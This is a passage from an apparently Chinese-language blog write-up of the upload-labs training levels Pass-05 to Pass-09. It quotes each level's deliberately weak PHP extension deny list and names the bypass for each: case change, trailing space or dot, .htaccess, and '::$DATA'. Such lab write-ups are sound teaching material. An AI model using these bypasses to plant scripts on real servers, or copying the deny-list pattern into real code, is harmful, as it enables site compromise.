punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上题一样，.htaccess绕过</p><h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传<code>Php</code>绕过黑名单</p><h2 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h2><p>在文件后缀名上加一个空格就行了</p><h2 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h2><p>上传<code>.php.</code>绕过</p><h2 id="Pass-08-DATA-绕过"><a href="#Pass-08-DATA-绕过" class="headerlink" title="Pass-08 ::$DATA 绕过"></a>Pass-08 ::$DATA 绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用Windows的特性如果文件名+ ::$DATA 会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持 ::$DATA 之前的文件名 他的目的就是不检查后缀名,上传.php::$DATA绕过。</p><h2 id="Pass-09-点-空格-点-绕过"><a href="#Pass-09-点-空格-点-绕过" class="headerlink" title="Pass-09 点 + 空格 + 点 绕过"></a>Pass-09 点 + 空格 + 点 绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token 